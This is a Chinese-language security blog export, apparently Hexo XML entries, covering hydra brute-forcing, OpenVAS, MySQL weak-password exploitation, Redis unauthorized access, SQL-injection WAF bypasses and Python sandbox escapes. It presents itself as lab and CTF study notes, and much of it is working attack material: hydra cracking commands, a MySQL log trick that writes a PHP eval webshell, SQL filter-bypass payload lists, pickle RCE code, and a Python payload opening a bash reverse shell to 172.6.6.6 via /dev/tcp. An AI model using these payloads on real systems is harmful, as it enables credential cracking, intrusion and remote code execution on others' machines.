小写，指定密码破解，少用，一般是采用密码字典。-P FILE 大写，指定密码字典。-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。-M FILE 指定目标列表文件一行一条。-o FILE 指定结果输出文件。-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。-t TASKS 同时运行的线程数，默认为16。-w TIME 设置最大超时的时间，单位秒，默认是30s。-v / -V 显示详细过程。server 目标ip# hydra的使用十分简单，用得比较多的是-P，-p,-l,-L选项，常见的暴力破解命令举例：#破解ssh：hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.8 ssh#破解smb hydra -l administrator -P pass.txt 10.36.16.18 smb #破解mysqlhydra -l root –p pass.txt –e ns 127.0.0.1 mysql#破解post web登陆hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot;# 关于hydra的代理使用,现在已经支持socks5,socks4,http,同时可以支持代理列表的方式，现在已经可以支持64个实体代理列表export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)export HYDRA_PROXY=connect_and_socks_proxylist.txt (up to 64 entries)export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080export HYDRA_PROXY_HTTP=proxylist.txt (up to 64 entries) OpenVASOpenVAS是开放式漏洞评估系统，Nessus项目分支，可以用来管理目标系统的漏洞，并且免费开源，在kali默认安装，但未配置和启动。它里面集成了现在比较大型的漏洞发布平台的数据库，并且可以实现自动化poc利用和漏洞探测，包括CVE，NVD等。 这个工具的安装还是相当的繁琐的，涉及证书的导入，redis,sqlite3数据库的安装,还有漏洞数据库的更新，整个流程做下来还是相当的费时间的。在虚拟机的fedora里面体验了一把原生态的安装流程，真的是要吐血了，好在现在有docker这个神器，一切都是那么的优雅。所以现在记录一下fedora,kali,docker的安装流程。其实docker里的安装其实是基于ubuntu 16.04的镜像进行构建的，查看Dockerfile可以学习到ubuntu 16.04下的安装办法。 Kali 2.01234567891011121314151617181920212223# 安装apt-get -y install openvas# 启动流程，涉及证书导入，数据库启动，openvas进程启动等，有些费时openvas setup# 检擦安装版本8或者版本9的开启情况，现在的最新版本是版本9，这个脚本比较方便我们去判断到底openvas是否启动完成，如果有报错，我们可以根据日志文件和fix建议进行相关操作。openvas-check-setup [-v8]|[-v9] /*使用openvas-stop或openvas-start命令，将同时停止或启动OpenVAS服务中的三个程序，即Greenbone Security Assistant、OpenVAS Scanner和OpenVAS Manager。如果用户想要启动或停止单个服务时，可以使用service命令实现。9390为openvas 管理端端口9391 scanner扫描端口9392 web界面登录端口*/# 获取/创建用户，并修改用户密码openvasmd --get-userssudo openvasmd --create-user=admin --role=Adminopenvasmd --user=admin --new-password=123# openvas 版本升级openvas-feed-update fedora安装1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#关闭selinuxvim /etc/selinux/config #将SELINUX=enforcing改为SELINUX=disabled,重启机器即可# 更新sudo dnf update#安装openvassudo dnf install openvas*#安装redissudo dnf install redis* -y#安装sqlite3sudo dnf install sqlite3* -y#安装证书生成工具sudo dnf guntls-utils#编辑redis配置文件，删除以下前导符‘#’# unixsocket /tmp/redis.sock# unixsocketperm 700#后台启动redissudo redis-server /etc/redis.conf&amp;#检擦启动情况openvas-check-setup [-v8]|[-v9] #同步nvt库sudo greenbone-nvt-sync#建立同步本地scapdata数据库sudo greenbone-scapdate-sync#获取证书sudo greenbone-certdata-sync#递归创建需要的目录sudo mkdir -p /var/lib/openvas/openvasmd/gnupg#启动scannersudo openvassd#重建数据库,耗时较久sudo openvasmd --rebuild#创建用户和修改密码sudo openvasmd --create-user=admin --role=Adminopenvasmd --user=admin --new-password=password#生成证书sudo openvas-manage-cert -a#启动gsad(greenbone security assistant),设置端口信息sudo gsad --listen=127.0.0.1 --port=9392 #启动openvasdsudo openvasd 启动1234sudo redis-server /etc/redis.conf &amp;sudo openvassdsudo openvasmdsudo gsad --listen=127.0.0.1 --port=9392 docker1234567# 搜索镜像docker search openvas#选择排名最高的docker pull mikesplain/openvas:9#限制cpu和内存，以deamon方式启动镜像docker run --cpuset-cpus=2 -m 2048M -d -p 443:443 --name openvas mikesplain/openvas:9#浏览器访问：https://localhost,登陆用户名/密码为：admin/admin，enjoy! mysql弱密码环境配置搭建好lamp后开始进行修改配置 mysql设置远程访问12345678# 修改配置文件和设置远程访问运行，以root用户为例GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION;# 把所有权限赋予root用户,并让root用户拥有分配这些权限的权利，同时设置登陆密码为123456，同时接受任何远程主机的连接FLUSH PRIVILEGES #刷新权限表体外话：# 假设要给lypto用户在192.168.1.100的内网机器访问的权限，则//GRANT ALL PRIVILEGES ON *.* TO &apos;lypto&apos;@’192.168.1.100’ IDENTIFIED BY &apos;654321&apos; WITH GRANT OPTION; iptables 端口放行12iptables -A INPUT -p tcp --dport 3306 -j ACCEPTiptables -A OUTPUT -P tcp --sport 3306 -j ACCEPT 漏洞验证hydra爆破为了减少爆破难度和速度，mysql远程登陆的密码设置为123456，并且自制字典仅包含两项wearefamily,123456,尝试爆破 OpenVAS扫描 使用openvas进行扫描，设置参数的时候为了减少扫描时间，可以设置只扫描3306端口，尽管这样，因为是虚拟机里面运行，所以比较慢，最后结果比较理想，不仅仅返回了mysql弱密码的9.0以上的高危漏洞评级，而且在漏洞细节里面还爆破出了密码：123456 漏洞利用登陆mysql后参数查看与信息搜集1234567891011121314151617select version();select @@version;select current_user();select user();select database();select @@version_compile_os;select @@basedir;# 默认值 5.7.20-0ubuntu0.16.04.1 /usr/ select @@datadir;# 默认值 5.7.20-0ubuntu0.16.04.1 /var/lib/mysql/select @@plugin_dir; # 默认值 5.7.20-0ubuntu0.16.04.1 /usr/lib/mysql/plugin/select @@secure_file_priv# 默认值 5.7.20-0ubuntu0.16.04.1 /var/lib/mysql-files/SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;SELECT @@global.secure_file_priv;show variables like &apos;%general%&apos;; mysql文件操作传shellsecure_file_priv mysql的一个全局只读变量,即使是root用户也没有办法对其进行运行时修改。用于限制数据的导入导出，例如load_file 和select … into outfile 等。mysql 5.5.53 和以前的版本，默认值为空。允许导入导出。之后的版本默认为‘NULL’ ,禁用了导入导出功能。为了安全，不要设置为空。可以设置为NULL 或者 一个限制好权限的目录。 靶机开放读写的权限，设置secure_file_prive=/var/www/html但是现在mysql以及相对安全了许多，默认的值是，并且不允许在运行时修改，这样在利用的时候就显得有些鸡肋。123456# 限制mysqld的导入和导出，完全禁止出。mysqld --secure_file_prive=null# 限制mysqld的导入和导出，只能在特定目录 /tmp/之下mysqld --secure_file_priv=/tmp/# 不限制mysqld的导入和导出在文件/etc/my.cnf中不写 --secure_file_priv 使用mysql日志功能写shell在网上看到可以开启日志记录功能，直接修改log的写入文件，就可以传入webshell,网上的教程如下：123set global general_log = on; # 开启general log模式set global general_log_file = &apos;/var/www/html/1.php&apos;; # 设置日志目录为shell地址select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; # 写入shell 但是在具体的实现过程中，发现这个利用也有相当多的限制条件，首先/var/www/html/下必须要有写的权限，其次写入的shell还要能够以apache2运行用户如www-data执行得起来。实操中发现，手动修改了/var/www/html 权限为777的条件下，在linux的环境下菜刀仍旧是连不上。当修改mysql log写入文件如shell.php的权限为777的时候，才可以连得上。但是令人最为费解的地方在于，以root用户身份重新修改了文件权限为原来的620，发现菜刀仍旧可以连得上，难不成这一次修改来回发生了什么不为人知的奥秘？笔者一时解释不清，暂时放在这。慢慢探讨究竟。 参考http://www.freebuf.com/column/152404.htmlhttps://www.cnblogs.com/zhaijiahui/p/8371336.htmlhttps://www.jianshu.com/p/a4f01fc3a720https://blog.csdn.net/qq_15983061/article/details/77892851http://blkstone.github.io/2017/12/31/mysql-sqli-to-webshell/]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>mysql弱密码</tag>
        <tag>hydra</tag>
        <tag>OpenVAS</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis未授权访问]]></title>
    <url>%2F2018%2F08%2F12%2Fredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[漏洞虽然是比较老，但是本着积累经验的思想，同时学习在docker环境下实现漏洞环境复现，折腾了些点时间，现把相关总结记录如下。dockerfile 已经上传在了github：https://github.com/IversionBY/vulntarget 漏洞知识背景Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。通俗的来说就是redis默认配置文件端口访问是不需要认证的。这样一来，根据redis服务运行权限，我们可以以其为门窗实现渗透利用，包括但不仅限于传webshell，root权限下的authorized_keys公钥注入，实现ssh免密登陆，回弹shell等一系列操纵。 redis基础数据类型：string(字符串),hash(散列),list(列表),set(集合),zset(有序集合)。每种数据类型都内置了很多方便操作的函数来实现对数据的处理。更多的可以参考:http://www.runoob.com/redis/redis-tutorial.html string 是 redis 最基本的类型，一个 key 对应一个 value。string也可以为二进制，图片等等类型。string 类型的值最大能存储 512MB 1234127.0.0.1:6379&gt; SET name &quot;1ypto&quot;OK127.0.0.1:6379&gt; GET name&quot;1ypto&quot; 哈希是一个key值里面有field和value的映射表，可以看成是有名字的字典。比较适合存储对象。 123456127.0.0.1:6379&gt; HMSET myhash field1 &quot;Hello&quot; field2 &quot;World&quot;&quot;OK&quot;127.0.0.1:6379&gt; HGET myhash field1&quot;Hello&quot;127.0.0.1:6379&gt; HGET myhash field2&quot;World&quot; Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）。列表和python有点类似，但是插入方式更为灵活，可以前（左），可以后（右）。列表最多可存储 232 - 1 元素 (4294967295, 每个列表可存储40多亿)。 12345678910111213127.0.0.1:6379&gt; LPUSH 1ypto redis(integer) 1127.0.0.1:6379&gt; LPUSH 1ypto hello(integer) 2127.0.0.1:6379&gt; LPUSH 1ypto hello(integer) 3127.0.0.1:6379&gt; RPUSH 1ypto world(integer) 4127.0.0.1:6379&gt; LRANGE 1ypto 0 31) &quot;hello&quot;2) &quot;hello&quot;3) &quot;redis&quot;4) &quot;world&quot; Redis 的 Set 是 String 类型的无序集合。集合成员是唯一的，这就意味着集合中不能出现重复的数据。不允许重复是和列表最大的差别。集合中最大的成员数为 232 - 1(4294967295, 每个集合可存储40多亿个成员)。 123456789101112127.0.0.1:6379&gt; sadd redis redis(integer) 1127.0.0.1:6379&gt; sadd redis hello(integer) 1127.0.0.1:6379&gt; sadd redis hello(integer) 0127.0.0.1:6379&gt; sadd redis world(integer) 1127.0.0.1:6379&gt; smember redis1) &quot;hello&quot;2) &quot;world&quot;3) &quot;redis&quot; Redis zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。zset的成员是唯一的,但分数(score)却可以重复。123456789101112127.0.0.1:6379&gt; zadd hacker 1 redis(integer) 1127.0.0.1:6379&gt; zadd hacker 5 hello(integer) 1127.0.0.1:6379&gt; zadd hacker 4 hello(integer) 0127.0.0.1:6379&gt; zadd hacker 3 world(integer) 1127.0.0.1:6379&gt; ZRANGEBYSCORE hacker 0 51) &quot;redis&quot;2) &quot;world&quot;3) &quot;hello&quot; 安装1234567hellogirl@Lypto:~$ wget wget http://download.redis.io/releases/redis-4.0.11.tar.gzhellogirl@Lypto:~$ tar zxf redis-4.0.11.tar.gzhellogirl@Lypto:~$ cd redis-4.0.11/hellogirl@Lypto:~/redis-4.0.11$ ls00-RELEASENOTES CONTRIBUTING deps Makefile README.md runtest runtest-sentinel src utilsBUGS COPYING INSTALL MANIFESTO redis.conf runtest-cluster sentinel.conf testshellogirl@Lypto:~/redis-4.0.11$ make 注意到安装完后redis-server,redis-cli在src文件夹里面，redis.conf配置文件在根目录下 常用命令123456789101112131415161718192021222324252627//登陆redis-cli -h host -p port -a password（if has） --raw(避免中文乱码)//系统QUIT //关闭连接HELP [CMD] //查看cmd帮助CLUSTER SLOTS //获取集群节点的映射数组COMMAND //获取 Redis 命令详情数组DBSIZE //返回当前数据库的 key 的数量KEYS * //列出所有key值KEYS [patten]//正则搜索键值INFO //获取redis服务器的各种信息//删除FLUSHDB // 清除当前数据库的所有keysFLUSHALL // 清除所有数据库的所有keys//攻击常用的向量CONFIG GET dir //获取默认的redis目录CONFIG SET dir [xxx] //修改redis目录CONFIG GET dbfilename //获取rdb文件名CONFIG GET dbfilename [xxx] //修改rdb文件名...... 更多命令可查阅官方文档：https://redis.io/commands 漏洞的利用方式我们可以根据漏洞的原理，从远程免认证登陆redis,然后利用内置命令如CONFIG等来做文章（上文提到的攻击向量）。常见的有这种利用方式，读取key值数据，进行信息搜集和泄露，删库改库以及回弹shell,写入webshell,ssh免密密登陆等一系列操作。前人的文章比较多，总结得也十分到位，这里给出一些链接。AlloyTeam：Redis 未授权访问漏洞利用总结p0’s blog：redis 未授权访问漏洞利用总结不请自来 | Redis 未授权访问漏洞深度利用 漏洞复现对于漏洞复现的部分，笔者使用的是docker容器进行部署。之前对docker的使用不算熟练，这次也算是加深了自己对docker的操作。这个漏洞复现是使用redis未授权访问进行ssh免密登陆。构建的容器中已经安装部署了redis-server和openssh-server,也写了自动化运行服务脚本，需要做的就是漏洞验证部分，具体可以参照上面的利用方式相关文章。 Dockerfile1234567891011121314151617FROM ubuntuMAINTAINER mini.lypto@gmail.comWORKDIR /rootRUN apt-get update\ &amp;&amp;apt-get install -y openssh-server\ &amp;&amp;apt-get -y install gcc\ &amp;&amp;apt-get -y install make\ &amp;&amp;wget http://download.redis.io/releases/redis-3.2.0.tar.gz\ &amp;&amp;tar -xzf redis-3.2.0.tar.gz\ &amp;&amp;cd redis-3.2.0\ &amp;&amp;makeCOPY ./redis.conf /root/redis-3.2.0COPY ./script.sh /root CMD ./root/script.sh 为了构建镜像，需要运用到虚拟机和主机的文件copy。先把修改好的redis.conf从镜像里面copy到主机，然后才可以在Dockerfile中使用COPY。 12345678//先拿到容器的短ID或者指定的namedocker ps -all//通过容器[短id]拿到ID全称docker inspect -f &apos;&#123;&#123;.Id&#125;&#125;&apos; [短id]//拿到全ID就可以进行相互copy了docker cp 本地文件路径 ID全称:容器路径docker cp ID全称:容器文件路径 本地路径 在从dockerfile构建镜像，部署容器的时候，记得做好端口映射，否则无法从外部访问redis以及ssh服务。1234567//通过Dockerfile构建镜像docker build -t ./ redisvuln:1.0//运行镜像并进行端口绑定，确保主机端口22,6379不被占用，或者修改为其他端口docker run -ti -p 22:22 -p 6379:6379 redisvuln//或者使用后台运行方式,然后使用docker logs查看输出docker run -d redisvuln]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>redis</tag>
        <tag>未授权访问</tag>
        <tag>漏洞</tag>
        <tag>docker</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypass_SQL]]></title>
    <url>%2F2018%2F08%2F08%2FBypass-SQL%2F</url>
    <content type="text"><![CDATA[之前对sql注入的原理方面的梳理比较多，现在打算对sql的Bypass技巧进行一个小小的总结，这里的技术是笔者进行了大量资料的阅读以及亲自实践，总结的是很不全面，有兴趣的可以继续对参考链接进行更深的学习。 SQL Bypass 大小写绕过1sElECt * FrOM TEST; 特殊执行 12#特殊代码执行/*!select*/ * /*!from*/ /*!test*/ 注释绕过 1234567#普通注释select/**/*/**/from/**/test;select/*b*/*/*c*/from/*d*/test;select/*b`123*/*/*c`123*/from/*d`123*/test;#内联注释,版本执行/*！50000select*/ * /*!50000from*/ test 利用DBMS的内置函数(加解密，编码与反编码函数,进制转换，转义\)编码：hex()bin()ascii()char()/chr()ord()unhex()加解密函数：mysql内置的加解密函数 123456789# 利用char支持最大4个字符的特性，进行字符串拼接,字符串的数字值可由select hex("pass"),select hex("word")求出SELECT concat(char(1885434739),char(2003792484)) ;--select passwordSELECT concat(char(x'70617373'),char(b'1110111011011110111001001100100')) #"password"# 使用‘\’进行关键字转义SELECT 'he\l\lo'='hello' --SELECT 1;#调用extractvalue()SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)); --select admin; 运算符绕过针对不同的DBMS，其操作符不一样，在某些字符串被filter掉的时候，我们可以尝试使用operatorshttps://www.postgresql.org/docs/6.5/static/operators1716.htmhttps://dev.mysql.com/doc/refman/8.0/en/comparison-operators.htmlhttps://docs.oracle.com/html/A95915_01/sqopr.htm HPP/HPF/HPC(详情参看之前写的文章——sql注入捣鼓 中介角色可以使用php这样的脚本语言来进行fuzz 12345678910$link = mysql_connect('server', 'username', 'password');mysql_select_db('database', $link);for($i = 0; $i&lt;= 255;$i++) &#123;$chr = chr($i);for($j = 0; $j&lt;=255;$j++) &#123;$chr2 = chr($j);if(mysql_query('SELECT'.$chr.'1'.$chr2.'', $link)) &#123;echo dechex($i).','.dechex($j).'&lt;br&gt;';&#125; &#125; &#125; 结果：更多的细节可以参考 https://websec.ca/kb/sql_injection#MySQL_Fuzzing_Obfuscation 编码绕过 12345678#URL Encoding SELECT %74able_%6eame FROM information_schema.tables;#Double URL Encoding SELECT %2574able_%256eame FROM information_schema.tables;#Unicode Encoding SELECT %u0074able_%u6eame FROM information_schema.tables;#Invalid Hex Encoding (ASP) SELECT %tab%le_%na%me FROM information_schema.tables; mysql的弱类型 123SELECT 0='hello'; # trueSELECT 1='hello'; # falseSELECT 1='1hello'; #true 避开使用关键字的正则绕过技巧 12345678910#SpacesSELECT schema_name FROM information_schema . schemata; #BackticksSELECT schema_name FROM `information_schema`.`schemata`; #Alternative Names(别名)，注意到以下几个表格的内容并不是完全一致，而是存在有细微的差别，主要体现在键值的影响上。information_schema.table=information_schema.partitions= information_schema.statistics= information_schema.key_column_usage= information_schema.table_constraints 字符的连接方式 1234SELECT 'a' 'd' 'mi' 'n';SELECT CONCAT('a', 'd', 'm', 'i', 'n');SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n'); 摘录一下网上的一些前辈总结得比较好的bypass语句 12345678910111213141516171819202122232425***note***:"====&gt;"左边表示会被Filtered的语句，"=&gt;"右边表示成功Bypass的语句，左边标红的为被Filtered的关键字，右边标蓝的为替代其功能的函数或关键字#filter and orand =&gt; &amp;&amp; or =&gt; ||#filter unionunion select user, password from users ====&gt; 1||(select user from users where user_id = 1) = 'admin #filter where1 || (select user from users where user_id = 1) = 'admin' ====&gt; 1||(select user from users limit 1) = 'admin # filter limit1 || (select user from users limit 1) = 'admin' ====&gt; 1||(select user from users group by user_id having user_id = 1) = 'admin'# filter group by1 || (select user from users group by user_id having user_id = 1) = 'admin' ====&gt; 1||(select substr(group_concat(user_id),1,1) user from users )=1# filter select 1 || (select substr(group_concat(user_id),1,1) user from users) = 1 ====&gt; 1||1 = 1 into outfile 'result.txt' 或者 1 || substr(user,1,1) = 'a' 1 || (select substr(group_concat(user_id),1,1) user from users) = 1 ====&gt; 1||user_id is not null 或者 1||substr(user,1,1) = 0x61 或者 1||substr(user,1,1) = unhex(61) # filter hex1||substr(user,1,1) = unhex(61) ====&gt; 1||substr(user,1,1) = lower(conv(11,10,36))# filter substr1||substr(user,1,1) = lower(conv(11,10,36)) ====&gt; 1||lpad(user,7,1) 参考https://websec.ca/kb/sql_injection#MySQL_String_Concatenationhttps://github.com/trietptm/SQL-Injection-Payloads/blob/master/LINKS.mdhttps://dev.mysql.com/doc/refman/8.0/en/encryption-functions.htmlhttps://www.owasp.org/index.php/SQL_Injection_Bypassing_WAFhttps://medium.com/bugbountywriteup/sql-injection-in-ctf-bef1ae0c5d9bhttps://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.htmlhttps://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#SyntaxBasicAttackshttps://www.exploit-db.com/papers/17934/PDF : tips_web-application-obfuscation-wafsevasion]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python沙箱绕过相关]]></title>
    <url>%2F2018%2F07%2F31%2Fpython%E6%B2%99%E7%AE%B1%2F</url>
    <content type="text"><![CDATA[在看到一些python命令执行的ctf题目的时候，才发现原来自己对python的了解还是那么的浅，但是基于python的web框架也日益盛行，python的命令执行是个需要好好学习的一个知识点，常见的漏洞利用方式或者说CTF的题目有SSTI，python沙箱绕过类pwn,所以为了恶补一下之前没有认真对待的python内置方法和魔术方法这些比较容易忽略的细节，现在把相关知识点总结如下。 payload搜集沙箱绕过中常用的os模块导入和命令执行姿势python的object类中集成了很多的基础函数，我们想要调用的时候也是可以通过创建对象进而引用12345678910111213#python2：[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].system('ls')"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')"".__class__.__mro__[-1].__subclasses__()[40](filename).read()"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1"')python3：''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('__global'+'s__')['os'].__dict__['system']('ls') 其他python命令执行的姿势导入os模块123import osos.system() os.popen() 导入commands模块1234import commandscommands.getstatusoutput() commands.getoutput()commands.getstatus() 导入subprocess模块1234import subprocesssubprocess.call(command, shell=True) subprocess.Popen(command, shell=True)subprocess.check_output(command, shell=True) 导入pty这个地方很多时候可以用来进行反弹shell的操作123456import ptypty.spawn()#例子：import ptypty.spawn(&apos;/bin/bash&apos;) 内置函数execfile()可以用来执行一个二进制文件123456789101112execfile(filename[, globals[, locals]])&apos;&apos;&apos;参数filename -- 文件名。globals -- 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。locals -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。返回值返回表达式执行结果。&apos;&apos;&apos;#例子：execfile(&apos;/usr/lib/python2.7/os.py&apos;) 导入timeit模块，间接执行命令注意到这个模块中主要有以下两个函数，都可以执行命令，后者可以执行一个命令多次123456789101112131415161718timeit(stmt=&apos;pass&apos;, setup=&apos;pass&apos;, timer=&lt;defaulttimer&gt;, number=1000000)&apos;&apos;&apos;返回： 返回执行stmt这段代码number遍所用的时间，单位为秒，float型参数： stmt：要执行的那段代码 setup：执行代码的准备工作，不计入时间，一般是import之类的 timer：这个在win32下是time.clock()，linux下是time.time()，默认的，不用管 number：要执行stmt多少遍 repeat(stmt=&apos;pass&apos;, setup=&apos;pass&apos;, timer=&lt;defaulttimer&gt;, repeat=3, number=1000000)这个函数比timeit函数多了一个repeat参数而已，表示重复执行timeit这个过程多少遍，返回一个列表，表示执行每遍的时间&apos;&apos;&apos;#例子：import timeittimeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1) 内置函数eval和exec123456789101112131415161718192021&apos;&apos;&apos;描述eval() 函数用来执行一个字符串表达式，并返回表达式的值。语法以下是 eval() 方法的语法:eval(expression[, globals[, locals]])参数expression -- 表达式。globals -- 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。locals -- 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。返回值返回表达式计算结果。&apos;&apos;&apos;#例子：eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)#exec 执行储存在字符串或文件中的Python语句，相比于 eval，exec可以执行更复杂的Python代码，但是需要注意的是python3与python2的细微差别。#例子1（python3）：exec(&apos;print(&quot;Hello World&quot;)&apos;)#例子2（python2）exec&apos;print &quot;Hello World&quot;&apos; platform库函数123456789platform.popen() #执行cmdplatform.platform() # 返回操作系统平台platform.uname() # 返回操作系统信息platform.system() # 返回操作系统平台platform.version() # 返回操作系统版本platform.machine() # 返回计算机类型platform.processor() # 返回计算机处理器类型platform.node() # 返回计算机网络名platform.python_version() # 返回Python版本号 pickle命令执行重写__reduce__方法123456789101112import cPickleimport osclass genpoc(object): def __reduce__(self): s = &quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot; #要执行的命令 return os.system, (s,) #os.system(&quot;echo test &gt;poc.txt&quot;)e = genpoc()poc = cPickle.dumps(e)print poc 运用marshal pickle code类型对象123456789101112131415161718192021import marshalimport base64import cPickleimport urllibdef foo():#you should write your code in this function import os def fib(n): if n &lt;= 1: return n return fib(n-1) + fib(n-2) print &apos;fib(10) =&apos;, fib(10) os.system(&apos;echo anycode &gt;&gt;poc.txt&apos;)try:#尝试使用cPickle来序列号代码对象 cPickle.dumps(foo.func_code)except Exception as e: print e #TypeError: can&apos;t pickle code objectscode_serialized = base64.b64encode(marshal.dumps(foo.func_code))print code_serialized python 内置函数菜鸟教程:http://www.runoob.com/python3/python3-built-in-functions.html1234567891011121314&gt;&gt;&gt; dir(__builtins__)['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError','BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError','ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError','FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError','IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented','NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError','ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError','TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning','ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs','all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod','enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals','map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice','sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip'] python类类的总结在python中有两种对象： 类型对象：可以被实例化和继承； 非类型对象：不可以被实例和继承。 &lt;class &#39;type&#39;&gt;和&lt;class &#39;object&#39;&gt;是python中的两个源对象。 每个对象都有类型。用objectname.__class__查看。 每个类型对象都有超类（object除外），用objectname.bases可以查看。 通过继承产生的新对象都是类型对象。继承是用class语句来实现的。 通过实例化产生的新对象可能是类型对象，也可能是非类型对象。实例化是通过调用操作符()来实现的。 一些python的非类型对象可以通过特殊的语法来创造。例如[1, 2, 3]是list的实例。 在内部，python总是使用类型对象来创造新对象。新创造的对象是该类型对象的实例。（在这里，实例有两种意思：一通过继承产生的子类，二是通过实例化产生的具体实例。但平时我们说的实例就是只第二种）。 python通过class语句中指定的超类的类型来决定新对象的类型。issubclass(A,B)返回true当且仅当：B在A.__bases__输出的元组之中;如果A在Z.__bases__输出的元组中，issubclass(Z,B)返回true.isinstance(A,B)返回true当且仅当：A.__class__是B，或者issubclass(A.__class__,B)返回true. 一张图了解元类，类型/类(python3里面以及把类型和类等同对待)，实例，其中实线表示继承关系，虚线表示实例。 类内置属性 __dict__ : 类的属性（包含一个字典，由类的数据属性组成） __doc__ :类的文档字符串 __name__: 类名 __module__: 类定义所在的模块（类的全名是’main.className’，如果类位于一个导入模块mymod中，那么className.module 等于 mymod） __bases__ : 类的所有父类构成元素（包含了一个由所有父类组成的元组） 属性区分 模块、类、函数均有以下属性：__dict__：该对象的属性字典。__doc__：返回说明性的文字，定义在块语句的最前面__name__：返回该对象的名字 类、函数均有以下属性：__module__:用来返回该对象的模块名。__class__：用来返回类的类型（或者实例的类）、或者函数的类型__globals__：用来返回该对象所有可用的全局变量名。 模块:__file__属性，用来返回模块包含路径的文件名__builtins__属性，用来返回所有的可以使用的内置函数、内置异常对象、内置保留字等对象。无论在任何位置，Python均会按照LEGB法则，在最后搜索模块的__builtins__属性，来最后判断该变量是否已经定义。 